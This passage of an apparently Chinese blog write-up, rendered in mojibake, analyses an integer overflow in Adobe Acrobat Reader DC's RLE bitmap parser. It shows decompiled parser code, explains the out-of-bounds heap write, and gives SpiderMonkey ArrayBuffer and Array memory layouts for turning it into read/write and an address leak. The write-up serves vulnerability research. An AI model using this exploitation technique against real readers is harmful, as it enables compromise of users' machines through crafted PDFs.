ä½ 4 ä½æ•°æ®</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// xpos ä¸ºå¥‡æ•°, å­˜å…¥å·²æœ‰å­—èŠ‚</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// xpos ä¸ºå¶æ•°, å­˜å…¥æ–°çš„å­—èŠ‚</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// ç¬¬ä¸€å­—èŠ‚ä¸ºé›¶ä¸”ç¬¬äºŒå­—èŠ‚ä¸ä¸ºé›¶</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// ä½å›¾ç»“æŸ</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta æ•°æ®</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// å‘å³ç§»åŠ¨</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// å‘ä¸Šç§»åŠ¨</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA å˜åŠ¨çš„åŸºæœ¬å—ä¹‹ä¸€</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// æœªå‹ç¼©æ•°æ®</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// è¯»å– 1 å­—èŠ‚æ•°æ®</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// ä½ 4 ä½æ•°æ®</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// é«˜ 4 ä½æ•°æ®</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// æ•°æ®å¯¹é½</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// å½“å‰è¡Œç»“æŸ</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// ä»ä¸‹å¾€ä¸Šç§»åŠ¨ä¸€è¡Œ</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// ç§»åŠ¨åˆ°è¡Œçš„èµ·ç‚¹</span></span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨ä¸¤ä¸ªä½ç½®å¯ä»¥è§¦å‘æ•´æ•°æº¢å‡ºï¼Œå…¶ä¸­ä¸€å¤„ä½äºå¤„ç†å‹ç¼©æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// é«˜ 4 ä½æ•°æ®</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// ä½ 4 ä½æ•°æ®</span></span><br><span class="line"><span class="comment">// 20CF45F8 å˜åŠ¨çš„åŸºæœ¬å—ä¹‹ä¸€</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>å¦ä¸€å¤„ä½äºå¤„ç†æœªå‹ç¼©æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA å˜åŠ¨çš„åŸºæœ¬å—ä¹‹ä¸€</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><h2 id="0x05-æ¼æ´åˆ©ç”¨"><a href="#0x05-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x05. æ¼æ´åˆ©ç”¨"></a>0x05. æ¼æ´åˆ©ç”¨</h2><h3 id="5-1-æº¢å‡ºç›®æ ‡"><a href="#5-1-æº¢å‡ºç›®æ ‡" class="headerlink" title="5.1 æº¢å‡ºç›®æ ‡"></a>5.1 æº¢å‡ºç›®æ ‡</h3><p>å‰é¢æåˆ°åœ¨è§£æ RLE æ•°æ®æ—¶å‘ç°äº† 3 ä¸ªæº¢å‡ºç‚¹ï¼Œè¿™é‡Œé€‰æ‹©å…¶ä¸­ç›¸å¯¹å®¹æ˜“å†™åˆ©ç”¨çš„æº¢å‡ºç‚¹æ¥è§¦å‘æ¼æ´ï¼šä½äº RLE8 æ•°æ®è§£æè¿‡ç¨‹ä¸­çš„ä¸€å¤„æ•´æ•°æº¢å‡ºã€‚</p><p>RLE4 æ•°æ®è§£æè¿‡ç¨‹ä¸­å­˜åœ¨çš„ä¸¤å¤„æº¢å‡ºç‚¹å¾ˆéš¾å®ç°ç¨³å®šåˆ©ç”¨ï¼Œå› ä¸ºåœ¨å‘æ‰«æçº¿å¡«å……åƒç´ æ•°æ®æ—¶ï¼Œåç§»å€¼ä¸º <code>xpos</code> çš„å€¼é™¤ä»¥ <code>2</code> ï¼Œæ­¤æ—¶åç§»å€¼æœ€å¤§å¯ä»¥æ˜¯ <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> ï¼Œä¹Ÿå°±æ„å‘³ç€ä»…èƒ½å‘é«˜åœ°å€æ–¹å‘å®ç°å †å—è¶Šç•Œå†™ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€ä¸Šå…·ä½“æ˜¯ä»€ä¹ˆæ•°æ®å¾ˆéš¾æ§åˆ¶ã€‚</p><p>è€Œ RLE8 æ•°æ®è§£æè¿‡ç¨‹ä¸­å­˜åœ¨çš„æº¢å‡ºç‚¹å°±ç›¸å¯¹å¥½æ§åˆ¶ä¸€äº›ï¼Œå› ä¸ºåœ¨å‘æ‰«æçº¿å¡«å……åƒç´ æ•°æ®æ—¶ï¼Œåç§»å€¼å°±æ˜¯ <code>xpos</code> æœ¬èº«ï¼Œè¿™æ ·å°±å¯ä»¥å‘ä½åœ°å€æ–¹å‘å®ç°å †å—è¶Šç•Œå†™ï¼Œè€Œä¸”è¶Šç•Œå†™çš„èŒƒå›´åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¹Ÿæ˜¯å¯æ§çš„ã€‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œ<code>(unsigned __int8)cmd</code> çš„æœ€å¤§å€¼å¯ä»¥æ˜¯ <code>0xFF</code> ï¼Œä¸ºäº†ç»•è¿‡ <code>if</code> è¯­å¥ä¸­çš„æ¡ä»¶æ£€æŸ¥ï¼Œ<code>xpos</code> çš„æœ€å°å€¼æ˜¯ <code>0xFFFFFF01</code> ï¼ˆåœ¨æœ‰ç¬¦å·ç±»å‹ä¸‹è¡¨ç¤ºä¸º <code>-255</code>ï¼‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€æœ€å¤§å¯ä»¥å‘ä½åœ°å€æ–¹å‘è¶Šç•Œå†™ <code>0xFF</code> å­—èŠ‚çš„æ•°æ®ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F å˜åŠ¨çš„åŸºæœ¬å—ä¹‹ä¸€</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”¨äºè¶Šç•Œå†™çš„æ•°æ®å¿…é¡»æ˜¯ä¸€æ ·çš„ï¼Œå³åªèƒ½æ˜¯åŒä¸€ä¸ªå­—èŠ‚ã€‚è¿™ä¼šç»™æ¼æ´åˆ©ç”¨å¸¦æ¥ä¸€äº›é¢å¤–çš„é—®é¢˜ï¼Œåç»­ä¼šå¯¹æ­¤è¿›è¡Œè¯¦ç»†è®¨è®ºã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure><h3 id="5-2-SpiderMonkey-åŸºç¡€çŸ¥è¯†"><a href="#5-2-SpiderMonkey-åŸºç¡€çŸ¥è¯†" class="headerlink" title="5.2 SpiderMonkey åŸºç¡€çŸ¥è¯†"></a>5.2 SpiderMonkey åŸºç¡€çŸ¥è¯†</h3><p>Adobe Acrobat Reader DC æ‰€ä½¿ç”¨çš„ JavaScript å¼•æ“ä¸º <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> ï¼Œåœ¨ç¼–å†™åˆ©ç”¨ä»£ç ä¹‹å‰ï¼Œå…ˆç®€å•ä»‹ç»ä¸€ä¸‹ç›¸å…³çš„åŸºç¡€çŸ¥è¯†ã€‚</p><h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>å¯¹ <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> è€Œè¨€ï¼Œå½“ <code>byteLength</code> çš„å¤§å°è¶…è¿‡ <code>0x68</code> æ—¶ï¼Œå…¶åº•å±‚æ•°æ®å­˜å‚¨åŒºï¼ˆ<strong>backing store</strong>ï¼‰æ‰€åœ¨çš„å †å—å°†é€šè¿‡ç³»ç»Ÿå †ç”³è¯·ï¼ˆ<code>ucrtbase!calloc</code>ï¼‰ï¼›å½“ <code>byteLength</code> çš„å¤§å°å°äºç­‰äº <code>0x68</code> æ—¶ï¼Œå †å—ä» SpiderMonkey çš„ç§æœ‰å † <strong>tenured heap</strong> ç”³è¯·ã€‚åŒæ—¶ï¼Œå½“ <strong>backing store</strong> ç‹¬ç«‹ç”³è¯·å †å—æ—¶ï¼Œéœ€è¦é¢å¤–ç”³è¯· <code>0x10</code> å­—èŠ‚çš„ç©ºé—´ç”¨äºå­˜å‚¨ <code>ObjectElements</code> å¯¹è±¡ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// å¯ä»¥æ˜¯ä»»æ„å€¼ï¼Œé€šå¸¸ä¸º 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// view å¯¹è±¡æŒ‡é’ˆ</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// å¯ä»¥æ˜¯ä»»æ„å€¼ï¼Œé€šå¸¸ä¸º 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹ <code>ArrayBuffer</code> è€Œè¨€ï¼Œè¿™é‡Œ <code>ObjectElements</code> çš„å„ä¸ªæˆå‘˜çš„åå­—æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼ˆå› ä¸ºæœ¬æ¥æ˜¯ä¸º <code>Array</code> å‡†å¤‡çš„ï¼‰ï¼Œè¿™é‡Œç¬¬äºŒä¸ªæˆå‘˜ <code>initializedLength</code> å­˜å‚¨ <code>byteLength</code> çš„å€¼ï¼Œç¬¬ä¸‰ä¸ªæˆå‘˜ <code>capacity</code> å­˜å‚¨å…³è”çš„ <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> å¯¹è±¡çš„æŒ‡é’ˆï¼Œå…¶ä»–æˆå‘˜å¯ä»¥æ˜¯ä»»æ„å€¼ã€‚</p><p>åœ¨ Adobe Acrobat Reader DC ä¸­æ‰§è¡Œä¸‹é¢çš„ JavaScript ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p><code>ArrayBuffer</code> å¯¹è±¡çš„ <strong>backing store</strong> çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>åœ¨æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå¯ä»¥æ›´æ”¹ <code>ArrayBuffer</code> å¯¹è±¡çš„ <code>byteLength</code> ä¸ºä¸€ä¸ªæ›´å¤§çš„å€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥åŸºäº <code>ArrayBuffer</code> å¯¹è±¡å®ç°è¶Šç•Œè¯»å†™äº†ã€‚ä¸è¿‡éœ€è¦æ³¨æ„åé¢çš„ <code>4</code> å­—èŠ‚æ•°æ®è¦ä¹ˆä¸ºé›¶ï¼Œè¦ä¹ˆæŒ‡å‘ä¸€ä¸ª <strong>åˆæ³•</strong> çš„ <code>DataView</code> å¯¹è±¡ï¼Œå¦åˆ™è¿›ç¨‹ä¼šç«‹åˆ»å´©æºƒã€‚</p><h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>å¯¹ <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> è€Œè¨€ï¼Œå½“ <code>length</code> çš„å¤§å°è¶…è¿‡ <code>14</code> æ—¶ï¼Œå…¶åº•å±‚å…ƒç´ å­˜å‚¨åŒºæ‰€åœ¨çš„å †å—å°†é€šè¿‡ç³»ç»Ÿå †ç”³è¯·ï¼ˆ<code>ucrtbase!calloc</code>ï¼‰ï¼›å½“ <code>length</code> çš„å¤§å°å°äºç­‰äº <code>14</code> æ—¶ï¼Œå †å—ä» SpiderMonkey çš„ç§æœ‰å † <strong>nursery heap</strong> ç”³è¯·ã€‚å’Œ <code>ArrayBuffer</code> ä¸€æ ·ï¼Œå½“åº•å±‚å…ƒç´ å­˜å‚¨åŒºç‹¬ç«‹ç”³è¯·å †å—æ—¶ï¼Œéœ€è¦é¢å¤–ç”³è¯· <code>0x10</code> å­—èŠ‚çš„ç©ºé—´ç”¨äºå­˜å‚¨ <code>ObjectElements</code> å¯¹è±¡ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ Adobe Acrobat Reader DC ä¸­æ‰§è¡Œä¸‹é¢çš„ JavaScript ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure><p><code>Array</code> å¯¹è±¡å…ƒç´ å­˜å‚¨åŒºçš„å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>array[0]</code> å’Œ <code>array[14]</code> çš„å€¼éƒ½æ˜¯ <code>41424344 ffffff81</code> ï¼Œå…¶ä¸­æ ‡ç­¾ <code>0xFFFFFF81</code> è¡¨ç¤ºå…ƒç´ çš„ç±»å‹ä¸º <code>INT32</code> ã€‚è€Œ <code>array[1]</code> åˆ° <code>array[13]</code> ä¹‹é—´çš„æ‰€æœ‰å…ƒç´ éƒ½è¢«å¡«å……ä¸º <code>00000000 ffffff84</code> ï¼Œè¡¨ç¤ºè¿™äº›å…ƒç´ å½“å‰æ˜¯æœªå®šä¹‰çš„ï¼ˆå³ <code>undefined</code> ï¼‰ã€‚</p><p>å¯¹ <code>Array</code> è€Œè¨€ï¼Œå¦‚æœå¯ä»¥é€šè¿‡è§¦å‘æ¼æ´æ›´æ”¹ <code>capacity</code> å’Œ <code>length</code> çš„å€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°è¶Šç•Œå†™æ“ä½œï¼šä»…ä»…æ˜¯è¶Šç•Œå†™ï¼Œå› ä¸º <code>initializedLength</code> ä¸å˜çš„è¯è¶Šç•Œè¯»å–çš„å…ƒç´ å…¨éƒ¨ä¸º <code>undefined</code> ï¼ŒåŒæ—¶ä¸€æ—¦è¿›è¡Œè¶Šç•Œå†™æ“ä½œï¼Œ<code>initializedLength</code> ä¹‹ååˆ°è¶Šç•Œå†™ä¹‹å‰çš„æ‰€æœ‰å…ƒç´ éƒ½ä¼šè¢«å¡«å……ä¸º <code>00000000 ffffff84</code> ï¼Œæ§åˆ¶ä¸å¥½çš„è¯å¾ˆå®¹å¯¼è‡´è¿›ç¨‹å´©æºƒã€‚</p><p>é‚£ä¹ˆå¦‚æœåŒæ—¶æ›´æ”¹ <code>initializedLength</code> å‘¢ï¼Ÿç†è®ºä¸Šé—®é¢˜ä¸å¤§ï¼Œä¸è¿‡å¯¹äºæœ¬æ–‡æ‰€è®¨è®ºçš„æ¼æ´è€Œè¨€ä¸é€‚ç”¨ï¼Œå› ä¸º <code>initializedLength</code> çš„å€¼ä¼šè¢«æ”¹æˆéå¸¸å¤§çš„å€¼ï¼ˆå››å­—èŠ‚å…¨éƒ¨ä¸ºç›¸åŒçš„æ•°æ®ï¼‰ï¼Œè€Œåœ¨ GC è¿‡ç¨‹ä¸­æ•°ç»„çš„æ‰€æœ‰å…ƒç´ éƒ½ä¼šè¢«æ‰«æï¼Œè¿›ç¨‹ä¼šå› ä¸ºè®¿é—®åˆ°ä¸å¯è®¿é—®çš„å†…å­˜é¡µè€Œå´©æºƒã€‚</p><h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>åœ¨ SpiderMonkey ä¸­ï¼Œæ‰€æœ‰ JavaScript å¯¹è±¡çš„ç±»éƒ½ç»§æ‰¿è‡ª <code>JSObject</code> ï¼Œåè€…åˆç»§æ‰¿è‡ª <code>ObjectImpl</code> ï¼Œç›¸å…³å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure><p>å¯¹æŸäº›å¯¹è±¡ï¼ˆæ¯”å¦‚ <code>DataView</code> ï¼‰è€Œè¨€ï¼Œ <code>elements</code> çš„å€¼æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå› æ­¤ä¼šæŒ‡å‘ä¸€ä¸ªé™æ€å…¨å±€å˜é‡  <code>emptyElementsHeader</code> ï¼Œè¯»å–è¿™äº›å¯¹è±¡çš„ <code>elements</code> çš„å€¼å¯ä»¥ç”¨äºæ³„éœ² JavaScript å¼•æ“æ¨¡å—çš„åŸºåœ°å€ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure><h3 id="5-3-ä½å›¾æ„é€ "><a href="#5-3-ä½å›¾æ„é€ " class="headerlink" title="5.3 ä½å›¾æ„é€ 